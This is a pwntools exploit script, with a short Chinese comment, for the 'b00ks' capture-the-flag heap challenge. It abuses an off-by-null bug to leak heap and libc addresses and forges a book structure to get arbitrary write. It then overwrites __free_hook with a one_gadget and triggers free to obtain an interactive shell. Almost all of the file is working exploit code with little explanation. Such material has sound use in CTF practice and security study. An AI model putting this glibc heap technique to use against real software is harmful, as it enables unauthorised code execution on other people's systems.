# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')
'''
漏洞：off-by-null
利用：
1、泄露堆地址，申请大堆获得libc:临界0x20000
2、off-by-null，让堆1指向可控的des
3、设置des使能修改table，任意写。
即edit（堆1）可以控制堆2的地址->改成freehook->再edit（堆2）成one_gadget。

'''


p = process("./b00ks")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def createbook(name_size,name,des_size,des):
	p.readuntil("> ")
	p.sendline("1")
	p.readuntil(": ")
	p.sendline(str(name_size))
	p.readuntil(": ")
	p.sendline(name)
	p.readuntil(": ")
	p.sendline(str(des_size))
	p.readuntil(": ")
	p.sendline(des)

def printbook(id):
	p.readuntil("> ")
	p.sendline("4")
	p.readuntil(": ")
	for i in range(id):
		book_id=int(p.readline()[:-1])
		p.readuntil(": ")
		book_name=p.readline()[:-1]
		p.readuntil(": ")
		book_des=p.readline()[:-1]
		p.readuntil(": ")
		book_author=p.readline()[:-1]
	return book_id,book_name,book_des,book_author

def createname(name):
	p.readuntil("name: ")
	p.sendline(name)

def changename(name):
	p.readuntil("> ")
	p.sendline("5")
	p.readuntil(": ")
	p.sendline(name)

def editbook(book_id,new_des):
	p.readuntil("> ")
	p.sendline("3")
	p.readuntil(": ")
	p.writeline(str(book_id))
	p.readuntil(": ")
	p.sendline(new_des)

def deletebook(book_id):
	p.readuntil("> ")
	p.sendline("2")
	p.readuntil(": ")
	p.sendline(str(book_id))


gdb.attach(p)
createname("a"*32)
createbook(0xd0,"a",0x30,"b")
createbook(0x21000,"a",0x21000,"b")


book_id_1,book_name,book_des,book_author=printbook(1)
book1_addr=u64(book_author[32:32+6].ljust(8,'\x00'))
log.success("book1_address:"+hex(book1_addr))

payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
editbook(book_id_1, payload)
changename("a"*32)
book_id_1,book_name,book_des,book_author=printbook(1)
book2_name_addr=u64(book_name.ljust(8,"\x00"))
book2_des_addr=u64(book_des.ljust(8,"\x00"))
log.success("book2 name addr:"+hex(book2_name_addr))
log.success("book2 des addr:"+hex(book2_des_addr))
libc_base=book2_des_addr-0x589010
log.success("libc base:"+hex(libc_base))

free_hook=libc_base+libc.symbols["__free_hook"]
one_gadget=libc_base+0x4526a
log.success("free_hook:"+hex(free_hook))
log.success("one_gadget:"+hex(one_gadget))
editbook(1,p64(free_hook)+p64(0xffff))
editbook(2,p64(one_gadget))

pause()
deletebook(2)
p.interactive()



